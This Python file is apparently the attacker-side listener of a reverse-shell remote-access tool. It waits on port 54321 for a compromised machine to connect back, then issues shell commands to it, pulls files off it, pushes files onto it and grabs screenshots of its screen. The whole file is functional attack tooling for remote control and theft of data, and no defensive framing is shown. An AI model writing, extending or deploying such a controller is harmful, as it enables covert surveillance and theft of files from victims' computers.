import socket 
from termcolor import colored
import json
import base64

count=1


def reliable_send(data):
    json_data=json.dumps(data)
    target.send(json_data.encode('utf-8'))

def reliable_recv():
    data=''
    while True:
        try:
            data=data+target.recv(1024).decode('utf-8')
            return json.loads(data)
        except ValueError:
            continue


def shell():
    
    while True:

        # command=raw_input("* Shell#-%s :"% str(ip))
        command=input("* Shell#-%s :"% str(ip))
        # target.send(command.encode('utf-8'))
        reliable_send(command)

        if command.lower()=="q":
        
            break
        elif command[:2]=="cd" and len(command)>2:
            continue
        elif command[:8]=="download":
            with open(command[9:],"wb") as file:
                file_data=reliable_recv()
                # we use base64 decode for downloading any kind of images or files as they are encoded with base 64
                file.write(base64.b64decode(file_data))
        elif command[:6]=="upload":
            with open(command[7:],"rb") as fle:
                print(command[7:])
                try:
                    # if we want to upload image then we need to base64 encode
                    fle_data=base64.b64encode(fle.read())
                    fle_data=fle_data.decode()
                    reliable_send(fle_data)
                except:
                    failed='failed to upload'.encode('utf-8')
                    failed=base64.b64encode(failed).decode()
                    reliable_send(failed)

        elif command[:10]=="screenshot":
            global count
            with open('screenshot%d.png'%count,"wb") as screen:
                image=reliable_recv()
                imge_decoded=base64.b64decode(image)
                if imge_decoded[:4]=="[!!]":
                    print(colored(imge_decoded,'red'))
                else:
                    screen.write(imge_decoded)
                    count+=1


        else:
            # message=target.recv(1024)
            msg=reliable_recv()
            
            if msg.lower()=="q":
                break
            # for now max of 1024 bytes can be sent
            print(msg)





def server():
    global s
    global ip
    global target
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
    
    s.bind(('0.0.0.0',54321))
    s.listen(5)
    print(colored("[+] Listening incoming connections","green"))
    
    target,ip=s.accept()
    # print(ip)
    # print(target)
    # here  ip is a tuple containing the ip adress and port number
    print(colored("[+] Connection Established From : "+str(ip),"green"))
    # print("connection established with "+str(ip))


server()

shell()

# s.close()
target.close()
print("socket closed")